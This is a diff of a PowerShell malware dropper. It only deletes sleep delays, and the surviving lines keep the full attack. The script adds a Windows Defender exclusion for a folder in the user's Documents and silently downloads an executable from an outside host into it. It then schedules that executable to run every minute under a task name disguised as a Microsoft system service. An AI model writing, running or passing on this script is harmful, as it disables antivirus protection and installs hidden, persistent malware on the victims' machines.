@@ -1,7 +1,4 @@
 New-Item C:\Users\$env:UserName\Documents\safe -Type Directory -Force
-Start-Sleep -Seconds 0.2
 Set-MpPreference -ExclusionPath C:\Users\$env:UserName\Documents\safe
-Start-Sleep -Seconds 0.2
 Start-Process powershell -WindowStyle hidden {Invoke-WebRequest -Uri "https://panel.totem.lol/bdc" -OutFile "C:\Users\$env:UserName\Documents\safe\bdc.exe"}
-Start-Sleep -Seconds 0.5
 schtasks /Create /SC MINUTE /RU $env:UserName /TN "Microsoft\Windows\SoftwareProtectionPlatform\SvcMaintenance" /TR "C:\Users\$env:UserName\Documents\safe\bdc.exe" /F
